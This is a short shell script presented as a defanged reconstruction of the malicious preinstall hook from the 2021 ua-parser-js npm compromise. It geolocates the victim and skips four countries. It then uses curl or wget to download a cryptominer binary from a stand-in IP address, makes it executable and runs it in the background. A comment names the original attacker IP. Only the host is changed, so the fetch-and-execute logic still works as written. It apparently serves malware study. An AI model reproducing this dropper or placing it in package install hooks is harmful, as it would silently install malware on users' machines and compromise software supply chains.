# Reconstruction of ua-parser-js 0.7.29 preinstall.sh (Oct 2021), defanged.
# Published behavior: skip victims in RU/UA/BY/KZ, then download `jsextension` (an XMRig
# miner) from 159.148.186.228 and run it. Geolocation service: stand-in (sinkholed).
COUNTRY=$(curl -s -m 3 https://ipinfo.io/country 2>/dev/null)
case "$COUNTRY" in RU|UA|BY|KZ) exit 0 ;; esac
curl -s -m 3 http://203.0.113.10/download/jsextension -o jsextension \
  || wget -q -t 1 -T 3 http://203.0.113.10/download/jsextension -O jsextension
[ -s jsextension ] && chmod +x jsextension && ./jsextension -k --tls &
exit 0
